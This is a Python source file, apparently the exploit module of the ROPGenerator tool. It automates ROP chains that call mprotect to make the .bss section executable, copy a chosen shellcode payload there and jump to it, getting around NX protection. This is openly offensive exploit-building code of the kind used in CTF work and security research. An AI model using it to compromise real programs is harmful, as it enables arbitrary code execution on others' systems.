# ROPGenerator - Exploit module 
# Building exploits for a binary :D !!
import ropgenerator.Context as Context
import ropgenerator.BinaryScanner as BinaryScanner
import ropgenerator.Analysis as Analysis
import ropgenerator.exploit.mprotect as mprotect
from ropgenerator.payload.Shellcode import selected
from ropgenerator.SearchEngine import search
from ropgenerator.Gadget import GadgetType
from ropgenerator.Constraints import Constraint 
import ropgenerator.SearchHelper as SearchHelper
import ropgenerator.Database as Database
from ropgenerator.Colors import string_bold, string_special, string_exploit

# Verbose mode
VERBOSE = True

def info(msg):
    global VERBOSE
    if( VERBOSE ):
        print(msg)

def print_exploit(exploit):
    """
    Exploit format is a list of pairs (ropchain, description)
    """
    print(string_bold("\n\tBuilt exploit\n"))
    for (chain, info) in exploit:
        print(string_bold("\t"+'-'*len(info)))
        print(string_exploit('\t'+info))
        print(string_bold("\t"+'-'*len(info)))
        for gadget_num in chain:
            if( SearchHelper.is_padding(gadget_num)):
                padding_str = string_special('0x'+format(SearchHelper.get_padding_unit(gadget_num), '0'+str(Analysis.ArchInfo.bits/4)+'x'))
                if( gadget_num == SearchHelper.DEFAULT_PADDING_UNIT_INDEX ):
                    padding_str += " (Padding)"
                elif( SearchHelper.get_padding_unit(gadget_num) in SearchHelper.addr_to_gadgetStr ):
                    padding_str += " ("+SearchHelper.addr_to_gadgetStr[SearchHelper.get_padding_unit(gadget_num)]+")"
                else:
                    padding_str += " (Custom Padding)"
                print("\t"+padding_str)
            else:
                print("\t"+string_special(Database.gadgetDB[gadget_num].addrStr) + " (" + string_bold(Database.gadgetDB[gadget_num].asmStr) + ")")


def exploit(args):
    build_exploit()
    
# Build an exploit 
def build_exploit():
    # get the shellcode 
    (payload, payload_info ) = selected(Analysis.ArchInfo.currentArch)
    if( not payload):
        print("Error, no payload selected :/ ")
        return 
        
    if( Context.NX ):
        if( Context.ASLR ):
            exploit = build_mprotect_datareuse(payload)
            if( exploit ):
                print_exploit(exploit)
            else:
                print("\tCould not build exploit")
        else:
            # TODO 
            pass
    else:
        # TODO
        pass


def build_mprotect_datareuse(payload):
    """
    Build a ROPchain that does :
        - mprotect RWX to a static memory area
        - copy payload to this memory area
        - jmp to payload 
    """
    # Get a constraint 
    constraint = Constraint()
    
    # First we get bad-bytes
    bad_bytes = Context.BAD_BYTES
    
    # Then get address of the bss
    bss_addr = BinaryScanner.bss_address()
    if( not bss_addr ):
        info("Could not find static .bss section to copy payload to")
        return []
        
    # Then get the mprotect chain
    if( Analysis.ArchInfo.currentArch == "X86-64" ):
        mprotect_chain = mprotect.mprotect_X64(bss_addr, len(payload)+1, 7)
    else:
        info("Not supported: mprotect chain for arch: ".format(Analysis.ArchInfo.currentArch))
        return []
    if( not mprotect_chain ):
        info("Could not build mprotect chain")
        return []
    mprotect_info = "Create RWX memory : calling mprotect({},{},{})".format(hex(bss_addr), len(payload)+1,7) 
        
    # Then write shellcode in memory 
    datareuse = search.str_to_mem(bss_addr, '.bss', payload, constraint)
    if( not datareuse ):
        info("Could not build datareuse chain")
        return []
    datareuse_info = "Copy payload into custom RWX memory"

    #Â Then jump to the payload
    ip_num = Analysis.regNamesTable[Analysis.ArchInfo.ip]
    jmp_payload = search.jmp_addr(bss_addr, constraint)
    if( not jmp_payload ):
        info("Could not build jmp_payload chain")
        return []
    jmp_payload_info = "Jump to payload"
    # Concatenate to full exploit
    return [[mprotect_chain,mprotect_info],[datareuse,datareuse_info],[jmp_payload, jmp_payload_info]]
